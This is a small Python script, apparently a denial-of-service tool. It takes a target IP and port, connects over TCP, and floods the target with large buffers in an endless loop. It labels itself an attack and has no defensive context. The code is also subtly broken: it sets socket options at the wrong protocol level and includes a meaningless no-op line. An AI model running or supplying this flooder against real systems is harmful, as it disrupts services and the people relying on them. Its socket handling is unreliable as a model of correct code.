import socket
import sys

ip = (sys.argv[1])
port = (sys.argv[2])

def attack(ip, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.TCP_NODELAY, True)
    s.setsockopt(socket.SOL_SOCKET, socket.IP_MULTICAST_LOOP, True)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 65507)
    data = bytearray(65507)
    data[0] = 0x1B
    target = (str(ip), int(port))
    s.connect(target)
    while True:
        for _ in range(100):
            _+1
            s.sendall(data)

if __name__ == '__main__':
    try:
        attack(ip, port)
    except KeyboardInterrupt:
        print("\033[32mAttack stopped.")